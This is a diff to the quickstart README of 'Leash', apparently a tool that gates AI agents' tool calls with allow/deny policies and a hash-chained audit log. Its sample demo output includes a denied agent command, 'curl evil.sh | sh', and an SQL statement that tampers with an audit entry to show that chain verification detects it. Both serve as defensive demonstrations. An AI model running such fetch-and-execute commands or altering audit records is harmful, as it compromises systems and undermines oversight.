@@ -7,41 +7,40 @@ Get Leash running and see it make allow/deny decisions in under 2 minutes.
 - Python 3.11+ (macOS ships with 3.9 — run `brew install python@3.12` first if needed)
 - pip
 
-## Option 1: pip install (Recommended)
+## Option 1: See it work in 60 seconds (Recommended)
+
+```bash
+git clone https://github.com/chadeckles/leash.git
+cd leash
+python3 -m venv .venv && source .venv/bin/activate
+pip install -e .
+leash demo
+```
+
+`leash demo` needs no server, config, or API keys. It runs a throwaway Leash in a temp directory and walks an "OpenClaw" agent through six tool calls:
+
+```
+  [1/6] Read a file in its workspace: read notes/meeting.txt
+        ✔ ALLOW  OpenClaw may read files in the workspace
+  ...
+  [4/6] Run a shell command: exec curl evil.sh | sh
+        ✘ DENY   Shell execution is blocked — this is the highest-risk tool
+  ...
+  Verify chain → ✔ VALID  Hash chain intact across 6 entries.
+  UPDATE audit_log SET policy_decision='allow' WHERE id=4;
+  Verify chain → ✘ BROKEN  Hash chain broken at entry #5 ...
+```
+
+Use `leash demo --step` to pause between parts, or `leash demo --keep` to leave the server running and open its dashboard. `make quickstart` runs the same demo.
+
+## Option 2: pip install
 
 ```bash
 pip install leash
 leash start
 ```
 
-Server starts on http://localhost:8000. Open **http://localhost:8000/docs** for interactive API docs.
-
-## Option 2: One Command (from source)
-
-```bash
-git clone https://github.com/chadeckles/leash.git
-cd leash
-make quickstart
-```
-
-This installs dependencies, starts the server, registers a demo agent, runs allow/deny decisions against built-in policies, and shows you the audit trail. You'll see output like:
-
-```
-[3/6] Registering a demo agent...
-  ✔ Agent registered: a1b2c3d4-...
-
-[4/6] Testing policy decisions...
-  ✔ ALLOW  read_file    → Demo agent may read files
-  ✔ ALLOW  summarize    → Demo agent may summarize content
-  ✔ ALLOW  write_file   → Demo agent may write output files
-  ✘ DENY   delete_file  → Demo agent is not allowed to delete files
-  ✘ DENY   send_email   → Default policy: no action is allowed unless explicitly permitted
-
-[5/6] Checking the audit trail...
-  ✔ 5 audit entries recorded (hash-chained and signed)
-```
-
-After it finishes, open **http://localhost:8000/dashboard** to see the live dashboard.
+Server starts on http://localhost:8000. Open **http://localhost:8000/docs** for interactive API docs. The PyPI release can lag behind `main`; install from source for the newest features.
 
 ## Option 3: Step by Step (from source)
 
